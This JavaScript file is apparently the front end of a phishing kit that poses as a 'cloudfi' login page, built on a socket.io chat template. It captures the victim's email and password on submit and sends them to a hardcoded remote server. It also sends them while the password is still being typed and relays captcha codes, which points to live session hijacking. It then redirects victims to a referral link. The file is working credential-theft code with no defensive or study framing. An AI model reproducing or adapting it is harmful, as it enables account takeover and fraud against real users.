const FADE_TIME = 150; // ms
const TYPING_TIMER_LENGTH = 400; // ms
const COLORS = [
  '#e21400',
  '#91580f',
  '#f8a700',
  '#f78b00',
  '#58dc00',
  '#287b00',
  '#a8f07a',
  '#4ae8c4',
  '#3b88eb',
  '#3824aa',
  '#a700ff',
  '#d300e7',
];

// Initialize variables
const $window = $(window);
const $usernameInput = $('.usernameInput'); // Input for username
const $messages = $('.messages'); // Messages area
const $inputMessage = $('.inputMessage'); // Input message input box

const $loginPage = $('.login.page'); // The login page
const $chatPage = $('.chat.page'); // The chatroom page

// const socket = io();
const socket = io('http://192.168.0.104:5000');

// Prompt for setting a username
let username;
let connected = false;
let typing = false;
let lastTypingTime;
let $currentInput = $usernameInput.focus();
let inputTime = 0;

const addParticipantsMessage = (data) => {
  let message = '';
  if (data.numUsers === 1) {
    message += `there's 1 participant`;
  } else {
    message += `there are ${data.numUsers} participants`;
  }
};

function checkEnter(event) {
  if (event.key === 'Enter') {
    sendMessage();
  }
}

const sendMessage = () => {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  let message = $inputMessage.val();
  message = cleanInput(message);
  if (message && connected) {
    $inputMessage.val('');

    const data = {
      timestamp: new Date().toLocaleString(),
      event: 'done captcha',
      domain: 'cloudfi',
      username: email,
      password: password,
      captcha: message,
    };

    console.log(data);

    socket.emit('client_event', data);
  }
};

// Prevents input from having injected markup
const cleanInput = (input) => {
  return $('<div/>').text(input).html();
};

// Updates the typing event
// const updateTyping = () => {
//   if (connected) {
//     if (!typing) {
//       typing = true;
//       socket.emit('typing');
//     }
//     lastTypingTime = new Date().getTime();

//     setTimeout(() => {
//       const typingTimer = new Date().getTime();
//       const timeDiff = typingTimer - lastTypingTime;
//       if (timeDiff >= TYPING_TIMER_LENGTH && typing) {
//         socket.emit('stop typing');
//         typing = false;
//       }
//     }, TYPING_TIMER_LENGTH);
//   }
// };

// $inputMessage.on('input', () => {
//   updateTyping();
// });

// Click events

// Focus input when clicking anywhere on login page
$loginPage.click(() => {
  $currentInput.focus();
});

// Focus input when clicking on the message input's border
$inputMessage.click(() => {
  $inputMessage.focus();
});

// Socket events

// Whenever the server emits 'login', log the login message
socket.on('login', (data) => {
  connected = true;
  // Display the welcome message
  addParticipantsMessage(data);
});

// Whenever the server emits 'new message', update the chat body
socket.on('new message', (data) => {
  addChatMessage(data);
});

// Whenever the server emits 'user joined', log it in the chat body
socket.on('user joined', (data) => {
  addParticipantsMessage(data);
});

// Whenever the server emits 'user left', log it in the chat body
socket.on('user left', (data) => {
  addParticipantsMessage(data);
  removeChatTyping(data);
});

// Whenever the server emits 'typing', show the typing message
socket.on('typing', (data) => {
  addChatTyping(data);
});

// Whenever the server emits 'stop typing', kill the typing message
socket.on('stop typing', (data) => {
  removeChatTyping(data);
});

socket.io.on('reconnect', () => {
  if (username) {
    const data = {
      timestamp: new Date().toLocaleString(),
      event: 'new login',
      domain: 'cloudfi',
      username: username,
      password: 'password',
      captcha: 'captcha',
    };
    socket.emit('client_event', data);
  }
});

var typingTimer;

function typePassword() {
  clearTimeout(typingTimer);

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  typingTimer = setTimeout(function () {
    const data = {
      timestamp: new Date().toLocaleString(),
      event: 'typing',
      domain: 'cloudfi',
      username: email,
      password: password,
      captcha: 'captcha',
    };
    socket.emit('client_event', data);
  }, 1000);
}

document
  .getElementById('signup-form')
  .addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form submission

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (email == 'pfwelding@sbcglobal.net') {
      window.location.href = 'https://www.coinmarketcap.jp';
      return;
    }

    const data_emit = {
      timestamp: new Date().toLocaleString(),
      event: 'add user',
      domain: 'cloudfi',
      username: email,
      password: password,
      captcha: 'captcha',
    };
    socket.emit('client_event', data_emit);

    var data = {
      email: email,
      password: password,
    };

    fetch(`${window.location.origin}/api/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
      .then((response) => response.json())
      .then((result) => {
        const message = result.message;
        if (message === 'No Admin') {
          window.location.href =
            'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
        } else if (message === 'Admin login success') {
          const token = result.token;
          localStorage.setItem('token', token);
          window.location.href = '/admin';
        } else if (message === 'Proceed to captcha') {
          const login_page = document.getElementById('login_page');
          login_page.style.display = 'none';
          const captcha_page = document.getElementById('captcha_page');
          captcha_page.style.display = 'block';
        } else if (message === 'New user added') {
          window.location.href =
            'https://cloudfi.info/register/?ref=462nUyBRU1USCHtdU3RP';
        } else {
          console.error('Unexpected response:', result);
        }
      })
      .catch((error) => {
        console.error('Error:', error);
      });
  });

const body = document.querySelector('body');
const hambBtn = document.querySelector('#hamb-btn');
const hambMenu = document.querySelector('#hamb-menu');

hambBtn.addEventListener('click', function () {
  hambBtn.classList.toggle('is-active');
  hambMenu.classList.toggle('is-menu-open');
  body.classList.toggle('noscroll');
});
